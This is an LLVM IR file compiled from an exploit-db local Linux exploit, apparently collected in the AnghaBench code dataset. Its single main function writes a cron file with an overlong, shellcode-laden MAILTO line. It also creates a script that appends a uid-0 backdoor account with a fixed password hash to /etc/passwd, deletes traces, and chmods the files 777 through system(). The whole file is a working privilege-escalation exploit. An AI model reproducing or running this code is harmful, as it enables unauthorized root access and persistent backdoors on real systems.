; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19469.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19469.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@max_buf_len = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [193 x i8] c"T h i s _ i s _ a _ s i m p l e _ e x p l o i t _ w r i t t e n _ b y _ A K K E _ T h i s _ i s _ a _ s i m p l e _ e x p l o i t _ w r i t t e n _ b y _ A K K E _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ \00", align 1
@.str.1 = private unnamed_addr constant [5 x i8] c"%s%s\00", align 1
@shellcode = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [11 x i8] c"MAILTO=%s\0A\00", align 1
@.str.3 = private unnamed_addr constant [2 x i8] c"0\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"%s,%d\00", align 1
@.str.5 = private unnamed_addr constant [13 x i8] c" * * * * %s\0A\00", align 1
@CronEchoScript = common dso_local global i8* null, align 8
@CronFile = common dso_local global i8* null, align 8
@.str.6 = private unnamed_addr constant [3 x i8] c"w+\00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.8 = private unnamed_addr constant [29 x i8] c"#!/bin/sh\0Aecho Wrong window!\00", align 1
@.str.9 = private unnamed_addr constant [10 x i8] c"%s 777 %s\00", align 1
@chmod_bin = common dso_local global i8* null, align 8
@RootScript = common dso_local global i8* null, align 8
@.str.10 = private unnamed_addr constant [69 x i8] c"#!/bin/sh\0Aecho %s:%s:0:0::/root:/bin/bash >> /etc/passwd\0Arm %s %s %s\00", align 1
@.str.11 = private unnamed_addr constant [9 x i8] c"cronexpl\00", align 1
@.str.12 = private unnamed_addr constant [14 x i8] c"1T8uqGnJZ0OsQ\00", align 1
@.str.13 = private unnamed_addr constant [8 x i8] c"/tmp/ce\00", align 1
@.str.14 = private unnamed_addr constant [14 x i8] c"#!/bin/sh\0A%s\0A\00", align 1
@login = common dso_local global i8* null, align 8
@passw = common dso_local global i8* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  %4 = alloca i64, align 8
  %5 = alloca i32*, align 8
  %6 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %7 = load i32, i32* @max_buf_len, align 4
  %8 = zext i32 %7 to i64
  %9 = call i8* @llvm.stacksave()
  store i8* %9, i8** %2, align 8
  %10 = alloca i8, i64 %8, align 16
  store i64 %8, i64* %3, align 8
  %11 = load i32, i32* @max_buf_len, align 4
  %12 = zext i32 %11 to i64
  %13 = alloca i8, i64 %12, align 16
  store i64 %12, i64* %4, align 8
  %14 = call i32 @strcpy(i8* %13, i8* getelementptr inbounds ([193 x i8], [193 x i8]* @.str, i64 0, i64 0))
  %15 = load i8*, i8** @shellcode, align 8
  %16 = call i32 (i8*, i8*, i8*, ...) @sprintf(i8* %13, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0), i8* %13, i8* %15)
  %17 = call i32 (i8*, i8*, i8*, ...) @sprintf(i8* %10, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.2, i64 0, i64 0), i8* %13)
  %18 = call i32 @strcat(i8* %10, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3, i64 0, i64 0))
  store i32 1, i32* %6, align 4
  br label %19

19:                                               ; preds = %25, %0
  %20 = load i32, i32* %6, align 4
  %21 = icmp slt i32 %20, 60
  br i1 %21, label %22, label %28

22:                                               ; preds = %19
  %23 = load i32, i32* %6, align 4
  %24 = call i32 (i8*, i8*, i8*, ...) @sprintf(i8* %10, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i64 0, i64 0), i8* %10, i32 %23)
  br label %25

25:                                               ; preds = %22
  %26 = load i32, i32* %6, align 4
  %27 = add nsw i32 %26, 1
  store i32 %27, i32* %6, align 4
  br label %19

28:                                               ; preds = %19
  %29 = load i8*, i8** @CronEchoScript, align 8
  %30 = call i32 (i8*, i8*, i8*, ...) @sprintf(i8* %13, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.5, i64 0, i64 0), i8* %29)
  %31 = call i32 @strcat(i8* %10, i8* %13)
  %32 = load i8*, i8** @CronFile, align 8
  %33 = call i32* @fopen(i8* %32, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.6, i64 0, i64 0))
  store i32* %33, i32** %5, align 8
  %34 = icmp ne i32* %33, null
  br i1 %34, label %35, label %40

35:                                               ; preds = %28
  %36 = load i32*, i32** %5, align 8
  %37 = call i32 (i32*, i8*, ...) @fprintf(i32* %36, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0), i8* %10)
  %38 = load i32*, i32** %5, align 8
  %39 = call i32 @fclose(i32* %38)
  br label %40

40:                                               ; preds = %35, %28
  %41 = load i8*, i8** @CronEchoScript, align 8
  %42 = call i32* @fopen(i8* %41, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.6, i64 0, i64 0))
  store i32* %42, i32** %5, align 8
  %43 = icmp ne i32* %42, null
  br i1 %43, label %44, label %53

44:                                               ; preds = %40
  %45 = load i32*, i32** %5, align 8
  %46 = call i32 (i32*, i8*, ...) @fprintf(i32* %45, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.8, i64 0, i64 0))
  %47 = load i32*, i32** %5, align 8
  %48 = call i32 @fclose(i32* %47)
  %49 = load i8*, i8** @chmod_bin, align 8
  %50 = load i8*, i8** @CronEchoScript, align 8
  %51 = call i32 (i8*, i8*, i8*, ...) @sprintf(i8* %13, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.9, i64 0, i64 0), i8* %49, i8* %50)
  %52 = call i32 @system(i8* %13)
  br label %53

53:                                               ; preds = %44, %40
  %54 = load i8*, i8** @RootScript, align 8
  %55 = call i32* @fopen(i8* %54, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.6, i64 0, i64 0))
  store i32* %55, i32** %5, align 8
  %56 = icmp ne i32* %55, null
  br i1 %56, label %57, label %68

57:                                               ; preds = %53
  %58 = load i32*, i32** %5, align 8
  %59 = load i8*, i8** @CronEchoScript, align 8
  %60 = load i8*, i8** @RootScript, align 8
  %61 = call i32 (i32*, i8*, ...) @fprintf(i32* %58, i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.10, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.11, i64 0, i64 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.12, i64 0, i64 0), i8* %59, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.13, i64 0, i64 0), i8* %60)
  %62 = load i32*, i32** %5, align 8
  %63 = call i32 @fclose(i32* %62)
  %64 = load i8*, i8** @chmod_bin, align 8
  %65 = load i8*, i8** @RootScript, align 8
  %66 = call i32 (i8*, i8*, i8*, ...) @sprintf(i8* %13, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.9, i64 0, i64 0), i8* %64, i8* %65)
  %67 = call i32 @system(i8* %13)
  br label %68

68:                                               ; preds = %57, %53
  %69 = call i32* @fopen(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.13, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.6, i64 0, i64 0))
  store i32* %69, i32** %5, align 8
  %70 = icmp ne i32* %69, null
  br i1 %70, label %71, label %80

71:                                               ; preds = %68
  %72 = load i32*, i32** %5, align 8
  %73 = load i8*, i8** @RootScript, align 8
  %74 = call i32 (i32*, i8*, ...) @fprintf(i32* %72, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.14, i64 0, i64 0), i8* %73)
  %75 = load i32*, i32** %5, align 8
  %76 = call i32 @fclose(i32* %75)
  %77 = load i8*, i8** @chmod_bin, align 8
  %78 = call i32 (i8*, i8*, i8*, ...) @sprintf(i8* %13, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.9, i64 0, i64 0), i8* %77, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.13, i64 0, i64 0))
  %79 = call i32 @system(i8* %13)
  br label %80

80:                                               ; preds = %71, %68
  %81 = call i32 @exit(i32 0) #4
  unreachable
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @strcpy(i8*, i8*) #2

declare dso_local i32 @sprintf(i8*, i8*, i8*, ...) #2

declare dso_local i32 @strcat(i8*, i8*) #2

declare dso_local i32* @fopen(i8*, i8*) #2

declare dso_local i32 @fprintf(i32*, i8*, ...) #2

declare dso_local i32 @fclose(i32*) #2

declare dso_local i32 @system(i8*) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
